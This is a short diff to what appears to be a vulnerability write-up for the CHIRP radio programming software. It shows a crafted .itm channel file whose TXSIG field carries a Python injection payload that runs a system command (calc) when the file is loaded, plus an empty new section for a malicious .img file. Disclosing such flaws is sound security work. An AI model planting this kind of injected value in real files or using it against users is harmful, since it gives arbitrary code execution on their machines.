@@ -30,12 +30,18 @@ Below are two POCs.
 
 
 
-### Malicious `.itm` structure
+### Malicious `.itm`
 
 ```
 // Conventional Data
 CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG
 1,1,146.520000,146.520000,PoC,__import__('os').system('calc'),0
+```
+
+### Malicious `.img`
+
+```
+
 ```
 
 ### Triggering in CHIRP
